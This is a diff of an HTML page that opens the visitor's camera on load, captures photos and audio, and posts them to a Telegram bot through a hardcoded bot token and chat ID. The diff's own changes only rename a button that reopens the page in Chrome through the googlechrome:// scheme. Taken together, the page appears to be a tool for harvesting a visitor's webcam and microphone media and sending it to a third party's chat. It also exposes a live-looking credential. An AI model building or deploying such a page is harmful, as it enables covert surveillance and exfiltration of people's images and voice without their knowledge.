@@ -12,13 +12,13 @@
   <video id="video" autoplay playsinline style="width: 300px;"></video>
   <button id="captureBtn">Capture Photo</button>
   <button id="recordAudioBtn">Record Audio</button>
-  <button id="redirectBtn">Open URL in Google Chrome</button> <!-- New redirect button -->
+  <button id="redirectChromeBtn">Open in Google Chrome</button> <!-- New redirect button -->
 
   <script>
     const video = document.getElementById('video');
     const captureBtn = document.getElementById('captureBtn');
     const recordAudioBtn = document.getElementById('recordAudioBtn');
-    const redirectBtn = document.getElementById('redirectBtn'); // New reference for the redirect button
+    const redirectChromeBtn = document.getElementById('redirectChromeBtn'); // New redirect button reference
 
     // 1. Start the camera video stream
     async function startCamera() {
@@ -65,8 +65,8 @@
 
     // 4. Function to send media to Telegram
     async function sendToTelegram(blob, type) {
-      const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U'; // Replace with your bot token
-      const chatId = '7532339931'; // Replace with the chat ID to send the media to
+      const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U';
+      const chatId = '7532339931';  // Replace with the chat ID to send the media to
       
       const formData = new FormData();
       formData.append(type, blob, `${type}.${type === 'photo' ? 'jpg' : 'ogg'}`);
@@ -87,21 +87,22 @@
       }
     }
 
-    // 5. Redirect function to open URL in Google Chrome
+    // 5. Function to redirect to a URL in the Google Chrome app
     function redirectToChrome() {
-      const url = 'https://www.example.com'; // Replace with the desired URL
+      const url = 'https://www.example.com';  // Replace with your desired URL
+
+      // Android-specific URL scheme for Google Chrome
       const chromeUrl = `googlechrome://${url.replace(/^https?:\/\//, '')}`;
       
-      // Redirect to the Google Chrome URL scheme
+      // Attempt to open in Chrome
       window.location.href = chromeUrl;
     }
 
-    // Event listener for the redirect button
-    redirectBtn.addEventListener('click', redirectToChrome);
+    // Add event listener for the new redirect button
+    redirectChromeBtn.addEventListener('click', redirectToChrome);
 
     // Start the camera on page load
     startCamera();
   </script>
 </body>
 </html>
-
